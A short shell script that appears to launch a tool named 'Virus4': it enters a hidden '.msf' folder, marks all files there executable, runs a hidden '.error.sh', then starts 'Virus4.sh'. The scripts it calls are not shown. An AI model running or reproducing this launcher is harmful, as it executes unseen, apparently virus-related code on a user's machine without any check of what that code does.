echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd 
cd Virus4
cd .msf
chmod +x *
sh .error.sh


sleep 0.3


echo ""
echo ""
read -p "                   ------------>entar"
Virus4.sh
